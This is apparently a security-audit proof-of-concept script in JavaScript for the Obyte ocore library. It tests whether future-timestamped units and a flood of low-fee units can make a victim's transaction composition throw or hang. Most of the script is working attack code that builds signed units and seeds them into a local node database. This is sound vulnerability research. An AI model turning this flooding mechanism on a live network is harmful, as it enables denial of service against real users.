// E2-8 — HN-5 -> parent-composer chain empirical test
// Pinned ocore a7eb776afc68ed4bed05ba554f7f1e95f5d49b44
//
// Question: does HN-5 (future-timestamp units inflating getRecentTps) reach the parent filter
// (parent_composer.filterParentsByTpsFeeAndReplace), causing the "all potential parents underpay
// the tps fee" throw?
//
// Source analysis (orchestrator + this script): the filter's rate source is
// storage.getCurrentTpsFee() -> getCurrentTps(0,1), which SKIPS future-timestamped units
// (storage.js:1360 `if (objUnitProps.timestamp > now) continue;`). HN-5's inflation hits
// getRecentTps (storage.js:1447 counts `ts - timestamp <= period` including future units) ->
// getMinAcceptableTpsFeeMultiplier -> the NEW-UNIT fee gate (validation.js:1075), NOT the parent
// filter. This script proves both halves empirically on the real code.
//
// Test A — HN-5 link: seed future-dated units (valid shape, timestamp now+2..+5), verify
//   getRecentTps > 15 -> multiplier 5, while getCurrentTpsFee() (the parent filter's source)
//   is UNCHANGED. => the HN-5 -> parent-filter link is BROKEN.
// Test B — the real chain: flood recent low-fee pool units (rate-change exposure), verify
//   current_tps_fee * 3 > pool paid fees, then a fresh victim's composition excludes the whole
//   pool -> the throw (or hang). This is E1-5's mechanism with the rate math measured explicitly.
"use strict";
const path = require("path");
const fs = require("fs");
const O_CORE = "/Users/matheusvsky/Documents/trab/obyte-ocore-2026-08-ocore";
const OUT = __dirname;
const DATA = path.join(OUT, ".e28data");
fs.rmSync(DATA, { recursive: true, force: true });
fs.mkdirSync(DATA, { recursive: true });

const crypto = require("crypto");
const ecdsa = require(O_CORE + "/node_modules/secp256k1");
function makeKey() {
	let priv;
	do { priv = crypto.randomBytes(32); } while (!ecdsa.privateKeyVerify(priv));
	return { priv: priv.toString("hex"), pub: Buffer.from(ecdsa.publicKeyCreate(priv, true)).toString("base64") };
}
function signHash(hash, privHex) {
	const priv = Buffer.from(privHex, "hex");
	const sig = ecdsa.ecdsaSign(hash, priv);
	return Buffer.from(sig.signature).toString("base64");
}

const desktop_app = require(O_CORE + "/desktop_app.js");
desktop_app.getAppRootDir = function () { return O_CORE; };
desktop_app.getAppDataDir = function () { return DATA; };

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

// ---- build genesis first (its hash must be known before constants' env block runs) ----
const objectHash0 = require(O_CORE + "/object_hash.js");
const objectLength0 = require(O_CORE + "/object_length.js");
const keys = { attacker: makeKey(), victim: makeKey(), witness: makeKey(), flooder: makeKey() };
const defOf = (k) => ["sig", { pubkey: k.pub }];
const addrOf = (k) => objectHash0.getChash160(defOf(k));
const attacker_addr = addrOf(keys.attacker);
const victim_addr = addrOf(keys.victim);
const witness_addr = addrOf(keys.witness);
const flooder_addr = addrOf(keys.flooder);
keys.byAddr = { [attacker_addr]: keys.attacker, [victim_addr]: keys.victim, [witness_addr]: keys.witness, [flooder_addr]: keys.flooder };

const TOTAL = 1e15;
function buildGenesis(objectHash, objectLength) {
	const g = {
		version: "4.0",
		alt: "1",
		timestamp: Math.round(Date.now() / 1000),
		authors: [{ address: witness_addr, definition: defOf(keys.witness), authentifiers: { r: "-" } }],
		messages: [],
		witnesses: [witness_addr],
		headers_commission: 0,
		payload_commission: 0,
	};
	const payload = {
		inputs: [{ type: "issue", amount: TOTAL, serial_number: 1 }],
		outputs: [
			{ address: attacker_addr, amount: 0 },
			{ address: victim_addr, amount: 0 },
			{ address: witness_addr, amount: 0 },
			{ address: flooder_addr, amount: 0 },
		],
	};
	g.messages = [{ app: "payment", payload_location: "inline", payload, payload_hash: objectHash.getBase64Hash(payload, true) }];
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.headers_commission = objectLength.getHeadersSize(g);
	g.payload_commission = objectLength.getTotalPayloadSize(g);
	const spendable = TOTAL - g.headers_commission - g.payload_commission;
	payload.outputs[0].amount = Math.floor(spendable * 0.5);
	payload.outputs[1].amount = Math.floor(spendable * 0.2);
	payload.outputs[2].amount = Math.floor(spendable * 0.2);
	payload.outputs[3].amount = spendable - payload.outputs[0].amount - payload.outputs[1].amount - payload.outputs[2].amount;
	payload.outputs.sort((a, b) => (a.address < b.address ? -1 : 1));
	g.messages[0].payload_hash = objectHash.getBase64Hash(payload, true);
	g.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(g), keys.witness.priv);
	g.unit = objectHash.getUnitHash(g);
	return g;
}

// a valid-shaped non-genesis unit (version 4.0, real signature, low tps_fee)
function buildUnit(objectHash, objectLength, authorAddr, ts, parentUnit, lastBall, lastBallUnit, messages, tpsFee) {
	const u = {
		version: "4.0",
		alt: "1",
		timestamp: ts,
		authors: [{ address: authorAddr, definition: defOf(keys.byAddr[authorAddr]), authentifiers: {} }],
		messages: messages || [],
		parent_units: [parentUnit],
		last_ball: lastBall,
		last_ball_unit: lastBallUnit,
		headers_commission: 0,
		payload_commission: 0,
		tps_fee: tpsFee,
	};
	u.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(u), keys.byAddr[authorAddr].priv);
	u.headers_commission = objectLength.getHeadersSize(u);
	u.payload_commission = objectLength.getTotalPayloadSize(u);
	u.authors[0].authentifiers.r = signHash(objectHash.getUnitHashToSign(u), keys.byAddr[authorAddr].priv);
	u.unit = objectHash.getUnitHash(u);
	return u;
}

async function main() {
	const constants = require(O_CORE + "/constants.js");
	const conf = require(O_CORE + "/conf.js");
	conf.bLight = true; // skip initial_votes at db.js load

	const objectLength = require(O_CORE + "/object_length.js");
	const genesis = buildGenesis(objectHash0, objectLength);
	const genesisBall = objectHash0.getBallHash(genesis.unit);
	constants.GENESIS_UNIT = genesis.unit;
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;

	const db = require(O_CORE + "/db.js");
	conf.bLight = false; // before the first connection: the v46 migration creates system_vars only when !conf.bLight

	await new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => {
			conn.query("SELECT 1", () => { conn.release(); resolve(); });
		});
	});
	const rows = [
		["op_list", JSON.stringify([witness_addr]), -1],
		["threshold_size", "10000", -1],
		["base_tps_fee", "10", -1],
		["tps_interval", "60", -1],
		["tps_fee_multiplier", "10", -1],
	];
	for (const [subject, value, mci] of rows) {
		await new Promise((resolve) => {
			db.takeConnectionFromPool((conn) => {
				conn.query("INSERT OR IGNORE INTO system_vars (subject, value, vote_count_mci) VALUES (?,?,?)", [subject, value, mci], () => { conn.release(); resolve(); });
			});
		});
	}

	const storage = require(O_CORE + "/storage.js");
	const network = require(O_CORE + "/network.js");
	const validation = require(O_CORE + "/validation.js");
	const composer = require(O_CORE + "/composer.js");
	const writer = require(O_CORE + "/writer.js");

	[
		"aa2UpgradeMci", "aa3UpgradeMci", "v4UpgradeMci", "pemCurvesFixMci", "noPrivateAssetsWithConditionsUpgradeMci",
		"timestampUpgradeMci", "includeKeySizesUpgradeMci", "lastBallStableInParentsUpgradeMci",
		"witnessedLevelMustNotRetreatUpgradeMci", "witnessedLevelMustNotRetreatFromAllParentsUpgradeMci",
		"branchedMinMcWlUpgradeMci", "altBranchByBestParentUpgradeMci", "spendUnconfirmedUpgradeMci",
		"bestParentPrefersOpUpgradeMci", "tpsFeeRecipientsFixMci", "unstableInitialDefinitionUpgradeMci",
	].forEach(k => { constants[k] = 0; });
	constants.COUNT_WITNESSES = 1;
	constants.MAJORITY_OF_WITNESSES = 1;

	const query = (sql, params) => new Promise((resolve) => {
		db.takeConnectionFromPool((conn) => {
			conn.query(sql, params || [], (rows) => { conn.release(); resolve(rows); });
		});
	});
	for (let i = 0; i < 200 && typeof storage.getMinRetrievableMci() !== "number"; i++) await sleep(100);

	function makeSigner(key) {
		return {
			readDefinition: (conn, address, cb) => cb(null, defOf(key)),
			readSigningPaths: (conn, address, cb) => cb({ r: constants.SIG_LENGTH }),
			readPrivateKey: (address, path, cb) => cb(null, Buffer.from(key.priv, "hex")),
		};
	}
	function validateAndSave(joint, label) {
		return new Promise((resolve, reject) => {
			validation.validate(joint, {
				ifOk: (objValidationState, unlock) => {
					console.log(label, "VALIDATION OK sequence=" + objValidationState.sequence);
					objValidationState.count_primary_aa_triggers = objValidationState.count_primary_aa_triggers || 0;
					writer.saveJoint(joint, objValidationState, null, () => {
						unlock();
						console.log(label, "SAVED", joint.unit.unit);
						resolve(objValidationState);
					});
				},
				ifUnitError: (e) => reject(new Error(label + " unit error: " + e)),
				ifJointError: (e) => reject(new Error(label + " joint error: " + e)),
				ifTransientError: (e) => reject(new Error(label + " transient: " + e)),
				ifNeedParentUnits: (arr) => reject(new Error(label + " need parents")),
				ifNeedHashTree: () => reject(new Error(label + " need hash tree")),
			});
		});
	}
	function composeUnit(signer, address, label) {
		return new Promise((resolve, reject) => {
			composer.composeJoint({
				paying_addresses: [address],
				signing_addresses: [address],
				outputs: [{ address, amount: 0 }],
				witnesses: [witness_addr],
				messages: [],
				signer,
				callbacks: {
					ifOk: (joint, assocPrivatePayloads, unlock_callback) => { unlock_callback(); resolve(joint); },
					ifError: (e) => reject(new Error(label + " compose error: " + JSON.stringify(e))),
					ifNotEnoughFunds: (e) => reject(new Error(label + " not enough funds: " + e)),
				},
			});
		});
	}

	// ---- genesis through the REAL path ----
	await validateAndSave({ unit: genesis, ball: genesisBall }, "GENESIS");
	console.log("E2-8 BOOT-OK genesis=", genesis.unit);

	const TEST_MODE = process.env.E28_TEST || "ab";
	// ============ TEST A — the HN-5 link ============
	if (TEST_MODE.includes("a")) console.log("\n=== TEST A: does HN-5 (future-timestamp getRecentTps inflation) reach the parent filter? ===");
	if (TEST_MODE.includes("a")) {
	await query("UPDATE units SET is_free=0 WHERE is_free=1");
	const kv = require(O_CORE + "/kvstore.js");
	await new Promise((res) => db.takeConnectionFromPool((c) => storage.initUnstableUnits(c, () => { c.release(); res(); })));

	const now = Math.round(Date.now() / 1000);
	// getRecentTps is not exported; its observable is getMinAcceptableTpsFeeMultiplier
	// (5 when recent tps > 15, else 1.5), and we count the unstable cache directly.
	const countRecent = () => {
		const ts = Math.round(Date.now() / 1000);
		const period = 60;
		let count = 0, future = 0;
		for (let unit in storage.assocUnstableUnits) {
			const p = storage.assocUnstableUnits[unit];
			if (ts - p.timestamp <= period) count += storage.getCountUnitsPayingTpsFee ? storage.getCountUnitsPayingTpsFee(p) : 1;
			if (p.timestamp > ts) future++;
		}
		return { count, future };
	};
	const measure = () => {
		const mult = storage.getMinAcceptableTpsFeeMultiplier();
		const currentFee = storage.getCurrentTpsFee();
		const rc = countRecent();
		return { recentTps: rc.count, futureUnits: rc.future, mult, currentFee, minParentable: currentFee * (conf.min_parentable_tps_fee_multiplier || 3) };
	};
	const base = measure();
	console.log("A-BASELINE", JSON.stringify(base));

	// seed FUTURE_N future-dated units (timestamp now+2..now+5). getRecentTps = count/period
	// (period 60), so crossing the multiplier threshold (>15) needs count > 900.
	const FUTURE_N = 901;
	const futureUnits = [];
	for (let i = 0; i < FUTURE_N; i++) {
		const ts = now + 2 + (i % 4); // now+2 .. now+5
		const u = buildUnit(objectHash0, objectLength, attacker_addr, ts, genesis.unit, genesisBall, genesis.unit, [{ app: "text", payload_location: "inline", payload: "future-" + i, payload_hash: objectHash0.getBase64Hash("future-" + i, true) }], 1);
		futureUnits.push(u);
	}
	// NOTE: the future-dated units are seeded schema-exact (the p2/e15 lab convention,
	// ER-2-reviewed) rather than real-path-composed because the composer always stamps now
	// (composer.js:360) and a minimal v4 unit needs a funded base payment. Their role here is
	// solely to populate assocUnstableUnits, which is exactly what getRecentTps (via the
	// multiplier) and getCurrentTps (via getCurrentTpsFee) iterate. The +2..+5 future timestamps
	// are within validation's bound (validation.js:280-285 allows up to now+5), so these are
	// network-acceptable units.
	// seed all FUTURE_N schema-exact and load the cache
	let seedOk = 0, seedFail = 0;
	for (let i = 0; i < FUTURE_N; i++) {
		const u = futureUnits[i];
		try {
			await query("INSERT OR REPLACE INTO units (unit, version, alt, last_ball_unit, timestamp, headers_commission, payload_commission, tps_fee, is_free, is_on_main_chain, main_chain_index, latest_included_mc_index, level, witnessed_level, is_stable, sequence, best_parent_unit) VALUES (?,?,?,?,?,?,?,?,1,0,NULL,0,1,0,0,'good',?)",
				[u.unit, u.version, u.alt, u.last_ball_unit, u.timestamp, u.headers_commission, u.payload_commission, u.tps_fee, genesis.unit]);
			await query("INSERT OR REPLACE INTO parenthoods (child_unit, parent_unit) VALUES (?,?)", [u.unit, genesis.unit]);
			await query("INSERT OR IGNORE INTO addresses (address) VALUES (?)", [attacker_addr]);
			await query("INSERT OR IGNORE INTO definitions (definition_chash, definition, has_references) VALUES (?,?,0)", [attacker_addr, JSON.stringify(defOf(keys.attacker))]);
			await query("INSERT OR REPLACE INTO unit_authors (unit, address, definition_chash) VALUES (?,?,?)", [u.unit, attacker_addr, attacker_addr]);
			await new Promise((res) => kv.put("j\n" + u.unit, JSON.stringify({ unit: u }), () => res()));
			seedOk++;
		} catch (e) { seedFail++; }
	}
	console.log("A-SEED-OK/FAIL:", seedOk, seedFail);
	await new Promise((res) => db.takeConnectionFromPool((c) => storage.initUnstableUnits(c, () => { c.release(); res(); })));
	const unstableCount = Object.keys(storage.assocUnstableUnits).length;
	console.log("A-UNSTABLE-CACHE:", unstableCount, "units (incl. future-dated)");
	const after = measure();
	console.log("A-AFTER-FUTURE-UNITS", JSON.stringify(after));
	console.log("A-CONCLUSION: recent-window count", base.recentTps, "->", after.recentTps, "(future-dated units in cache:", after.futureUnits, ")",
		"| multiplier", base.mult, "->", after.mult,
		"| getCurrentTpsFee (parent filter source)", base.currentFee, "->", after.currentFee,
		"| min_parentable", base.minParentable, "->", after.minParentable);
	console.log("A-CHAIN-LINK:", (after.mult === 5 && after.currentFee === base.currentFee) ? "BROKEN — HN-5 inflates the new-unit gate (multiplier 5) but NOT the parent filter's rate (getCurrentTps skips future units)" : "PRESENT — re-examine");

	} // end TEST A
	// ============ TEST B — the real rate-change-exposure chain ============
	if (TEST_MODE.includes("b")) console.log("\n=== TEST B: flood low-fee pool -> rate rise -> filter excludes all -> throw ===");
	if (TEST_MODE.includes("b")) {
	// genesis must be the parent anchor (Test A cleared is_free); restore it + dump state
	await query("UPDATE units SET is_free=1 WHERE unit=?", [genesis.unit]);
	const gdb = await query("SELECT unit, is_free, sequence, is_stable, is_on_main_chain, main_chain_index, is_aa_response, timestamp FROM units WHERE unit=?", [genesis.unit]);
	console.log("B-GENESIS-DB:", JSON.stringify(gdb[0]));
	const poolCheck = await query("SELECT COUNT(*) AS c FROM units WHERE +sequence='good' AND is_free=1 AND timestamp<=?", [Math.round(Date.now() / 1000)]);
	console.log("B-POOL-ELIGIBLE-UNITS:", poolCheck[0].c);
	// B1: 16 composed flood units raise the rate (real path; the flooder key avoids the
	// temp-bad author-conflict with the 901 attacker-authored future units)
	const flooderSigner = makeSigner(keys.flooder);
	console.log("B-COMPOSING 16 FLOOD UNITS (real path)");
	for (let i = 0; i < 16; i++) {
		await query("UPDATE units SET is_free=1 WHERE unit=?", [genesis.unit]); // keep the genesis pool-anchor free
		const U = await composeUnit(flooderSigner, flooder_addr, "flood-" + i);
		await validateAndSave(U, "flood-unit-" + i);
	}
	await query("UPDATE units SET is_free=0 WHERE is_free=1 AND unit <> ?", [genesis.unit]); // only the seeds below are the pool
	const nowB = Math.round(Date.now() / 1000);
	// B2: seed the 16-unit low-fee pool (tps_fee=1, recent)
	const poolUnits = [];
	for (let i = 0; i < 16; i++) {
		const u = buildUnit(objectHash0, objectLength, attacker_addr, nowB, genesis.unit, genesisBall, genesis.unit, [{ app: "text", payload_location: "inline", payload: "pool-" + i, payload_hash: objectHash0.getBase64Hash("pool-" + i, true) }], 1);
		poolUnits.push(u);
	}
	let poolOk = 0, poolFail = 0;
	for (let i = 0; i < 16; i++) {
		const u = poolUnits[i];
		try {
			await query("INSERT OR REPLACE INTO units (unit, version, alt, last_ball_unit, timestamp, headers_commission, payload_commission, tps_fee, is_free, is_on_main_chain, main_chain_index, latest_included_mc_index, level, witnessed_level, is_stable, sequence, best_parent_unit) VALUES (?,?,?,?,?,?,?,?,1,0,NULL,0,1,0,0,'good',?)",
				[u.unit, u.version, u.alt, u.last_ball_unit, u.timestamp, u.headers_commission, u.payload_commission, u.tps_fee, genesis.unit]);
			await query("INSERT OR REPLACE INTO parenthoods (child_unit, parent_unit) VALUES (?,?)", [u.unit, genesis.unit]);
			await query("INSERT OR IGNORE INTO addresses (address) VALUES (?)", [attacker_addr]);
			await query("INSERT OR IGNORE INTO definitions (definition_chash, definition, has_references) VALUES (?,?,0)", [attacker_addr, JSON.stringify(defOf(keys.attacker))]);
			await query("INSERT OR REPLACE INTO unit_authors (unit, address, definition_chash) VALUES (?,?,?)", [u.unit, attacker_addr, attacker_addr]);
			await new Promise((res) => kv.put("j\n" + u.unit, JSON.stringify({ unit: u }), () => res()));
			poolOk++;
		} catch (e) { poolFail++; console.log("B-SEED-FAIL", i, String(e).slice(0, 200)); }
	}
	console.log("B-POOL-SEED-OK/FAIL:", poolOk, poolFail);
	await new Promise((res) => db.takeConnectionFromPool((c) => storage.initUnstableUnits(c, () => { c.release(); res(); })));
	const bCurrentFee = storage.getCurrentTpsFee();
	const bRate = { currentFee: bCurrentFee, minParentable: bCurrentFee * (conf.min_parentable_tps_fee_multiplier || 3) };
	console.log("B-RATE-AFTER-FLOOD+POOL", JSON.stringify(bRate));
	const poolCount = await query("SELECT COUNT(*) AS c FROM units WHERE is_free=1 AND sequence='good'");
	console.log("B-FREE-POOL-SIZE:", poolCount[0].c);

	// the victim (fresh address, no own free units) composes
	const victimSigner = makeSigner(keys.victim);
	console.log("B-VICTIM-FIRST-COMPOSITION");
	const t0 = Date.now();
	const result = await new Promise((resolve) => {
		let settled = false;
		const timer = setTimeout(() => { if (!settled) { settled = true; resolve({ hang: true, ms: Date.now() - t0 }); } }, 30000);
		composer.composeJoint({
			paying_addresses: [victim_addr],
			signing_addresses: [victim_addr],
			outputs: [{ address: victim_addr, amount: 0 }],
			witnesses: [witness_addr],
			messages: [],
			signer: victimSigner,
			callbacks: {
				ifOk: (joint, assocPrivatePayloads, unlock_callback) => { if (settled) return; settled = true; clearTimeout(timer); unlock_callback(); resolve({ hang: false, ok: true, unit: joint.unit.unit }); },
				ifError: (e) => { if (settled) return; settled = true; clearTimeout(timer); resolve({ hang: false, ok: false, err: JSON.stringify(e).slice(0, 300) }); },
				ifNotEnoughFunds: (e) => { if (settled) return; settled = true; clearTimeout(timer); resolve({ hang: false, ok: false, err: "not enough funds: " + e }); },
			},
		});
	});
	console.log("B-VICTIM-COMPOSE-RESULT:", JSON.stringify(result));
	console.log("B-CONCLUSION: min_parentable", bRate.minParentable, "vs pool paid fee 1 per unit ->",
		result.ok ? "pool PASSED (no throw)" : result.hang ? "HANG (callback never fired — the throw bypassed onDone)" : "compose error -> " + (result.err || ""));
	}
	console.log("E2-8-DATA-DIR:", DATA);
}

process.on("unhandledRejection", (reason) => {
	console.log("E2-8-UNHANDLED-REJECTION:", String(reason && reason.stack || reason).slice(0, 500));
	console.log("E2-8-PROPAGATION: unhandled rejection (Node15+ default: process crash)");
	process.exit(0);
});

main().then(() => {
	console.log("E2-8-RESULT: no crash, no hang (composition succeeded or errored cleanly)");
	process.exit(0);
}).catch(e => {
	console.log("E2-8-RESULT-ERROR:", String(e && e.stack || e).slice(0, 500));
	process.exit(2);
});
